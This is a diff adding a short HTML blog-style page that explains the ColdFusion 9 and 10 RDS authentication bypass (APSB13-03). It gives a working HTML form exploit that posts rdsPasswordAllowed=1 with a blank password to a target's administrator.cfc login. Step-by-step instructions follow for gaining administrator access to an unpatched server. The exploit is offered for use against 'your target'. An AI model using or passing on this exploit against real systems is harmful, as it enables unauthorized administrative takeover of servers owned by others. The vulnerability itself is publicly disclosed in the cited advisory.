@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>RDS Bypass With 9 and 10</title>
+</head><body>ColdFusion 9 and 10 (APSB13-03) <div style="text-align: justify">&nbsp;<br/>
+</div><div style="text-align: justify">I really like this one, but I need to explain a few things first. &nbsp;</div>&nbsp;<div style="text-align: justify">&nbsp;<br/>
+</div><div style="text-align: justify">ColdFusion have a component called Remote Development Services (RDS) which is a security component used by the ColdFusion Administrator and ColdFusion Studio to provide remote HTTP-access to files and databases for the developers. For example, the ColdFusion Administrator API CFC contains basic Administrator functionality, such as login, logout, the Migration wizard or the Setup wizard.<br/>
+<br/>
+One of the parameters in the Administrator API login function is called "rdsPasswordAllowed", and it defines if the user is allowed to login and access the adminapi with the RDS password. The problem is that in Adobe ColdFusion versions 9.0, 9.0.1, 9.0.2 and even in 10, the login function never checks if RDS is enabled when it is invoked with rdsPasswordAllowed="true" (<a href="http://www.adobe.com/support/security/bulletins/apsb13-03.html">APSB13-03</a>).<br/>
+<br/>
+This means that if RDS was not configured (most cases), the RDS user does not have a password associated with their username and by setting rdsPasswordAllowed to "true" and invoking the login function, we can bypass the admin login and use the rdsPassword, which in most cases (as RDS was not configured), is blank. For more details, <a href="http://www.exploit-db.com/exploits/27755/">check the description of Scot Buckel's exploit</a> [5]!<br/>
+<br/>
+And here is the code you can use:<br/>
+<ul><li>&lt;form action="http://[HOSTNAME:PORT]/CFIDE/adminapi/administrator.cfc?method=login" method="post"&gt;</li>
+<li>&lt;input name="adminpassword" type="hidden" value="" /&gt;</li>
+<li>&nbsp;&lt;input name="rdsPasswordAllowed" type="hidden" value="1" /&gt;</li>
+<li>&nbsp;&lt;input type="submit" /&gt;</li>
+<li>&lt;/form&gt;</li>
+</ul>
+&nbsp;<br/>
+All you have to do copy this into an empty file with .html extension, <br/>
+replace [HOSTNAME:PORT] with your target's address, <br/>
+drag the file into the browser, <br/>
+hit the "Submit Query" button <br/>
+and navigate to your targets ColdFusion administrator login page. T<br/>
+<br/>
+ada! You are now logged in as administrator! :)<br/>
+</div></body></html>
